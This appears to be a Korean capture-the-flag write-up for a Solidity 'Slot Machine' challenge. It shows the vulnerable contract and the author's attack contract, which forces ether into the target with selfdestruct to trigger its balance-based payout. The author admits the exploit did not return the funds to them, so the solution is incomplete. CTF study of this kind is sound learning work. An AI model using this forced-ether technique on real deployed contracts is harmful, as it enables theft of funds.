# Slot Machine

```solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract SlotMachine is CtfFramework{

    using SafeMath for uint256;

    uint256 public winner;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        winner = 5 ether;
    }

    function() external payable ctf{
        require(msg.value == 1 szabo, "Incorrect Transaction Value");
        // 1szabo가 아니면 전송할 수 없게 막아놨다
        if (address(this).balance >= winner){
            // 이러한 경우에 이더를 보내기 위해서 selfdestruct를 사용한다.
            msg.sender.transfer(address(this).balance);
            // 나의 경우 이 부분이 제대로 동작하지 않았는데 뭔가 실수 한 부분이 있는 것 같다
        }
    }

}
```

## 풀이방법

```solidity
pragma solidity 0.4.24;

contract slotmachineattack4{

address public owner = msg.sender;
address slotContractAddress;

function () payable public {}

function endIt(address destination) external {
    slotContractAddress = destination;
    //require(msg.sender == owner);
    selfdestruct(slotContractAddress);
}

}
```

```
위와 같은 스마트 컨트렉트를 하나 생성한 뒤, 해당 컨트렉트로 5 이더 이상의 이더를 보낸 뒤,
selfdestruct의 인자를 문제의 컨트렉트 주소로 하여 호출하면,
우리가 만든 스마트 컨트렉트가 파괴되면서 가지고 있던 이더를 문제의 컨트렉트로 보내게 된다.

ps. 나의 경우, 10이더를 내가 만든 컨트렉트에 송금 한 뒤,  selfdestruct를 실행하였는데
실제로 10이더가 문제의 컨트렉트로 전송되긴 하였으나 내 주소로 오지 않았다...
어디가 잘못된 것일까.... 추후에 수정할 필요가 있을 듯...
```
